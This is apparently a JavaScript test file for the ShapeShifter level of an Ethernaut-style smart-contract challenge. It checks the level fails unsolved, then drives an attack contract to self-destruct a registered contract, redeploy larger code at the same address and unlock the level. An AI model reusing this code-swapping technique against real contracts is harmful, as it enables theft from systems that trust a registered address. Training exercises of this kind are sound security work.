const ShapeShifterFactory = artifacts.require(
    "./levels/ShapeShifterFactory.sol"
);
const ShapeShifter = artifacts.require("./levels/ShapeShifter.sol");
const ShapeShifterAttack = artifacts.require(
    "./attacks/ShapeShifterAttack.sol"
);
const { ethers } = require('hardhat');

const utils = require("../utils/TestUtils");

contract("ShapeShifter", function (accounts) {
    let ethernaut;
    let level;
    let player = accounts[0];

    before(async function () {
        ethernaut = await utils.getEthernautWithStatsProxy();
        level = await ShapeShifterFactory.new();
        await ethernaut.registerLevel(level.address);
    });

    it("should fail if the player didnt solve the level", async function () {
        const instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            player,
            ShapeShifter
        );
        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        );

        assert.isFalse(completed);
    });

    it("should allow the player to solve the level", async function () {
        const instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            player,
            ShapeShifter
        );

        const attacker = await ShapeShifterAttack.new(instance.address, {
            from: player,
        });

        await attacker.deploySmallContract();
        console.log("Deployed small contract");
        await attacker.registerContract();
        console.log("Registered contract");

        const changingContractAddress = await attacker.changingContract();
        console.log("Changing contract address: ", changingContractAddress);

        const codeBefore = await ethers.provider.getCode(changingContractAddress)
        console.log("Code length before: ", codeBefore.length);

        await attacker.destroyContract();
        console.log("Destroyed contract");

        await ethers.provider.send("evm_mine", []);
        await ethers.provider.send("evm_mine", []);
        const codeAfterDestroy = await ethers.provider.getCode(changingContractAddress)
        console.log("Code length after destory", codeAfterDestroy.length);

        await attacker.deployLargeContract();
        console.log("Deployed large contract");

        const codeAfterRedeploy = await ethers.provider.getCode(changingContractAddress)
        console.log("Code length after destory", codeAfterRedeploy.length);

        await attacker.unlock();
        console.log("Unlocked");

        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        );

        assert.isTrue(completed);
    });
});
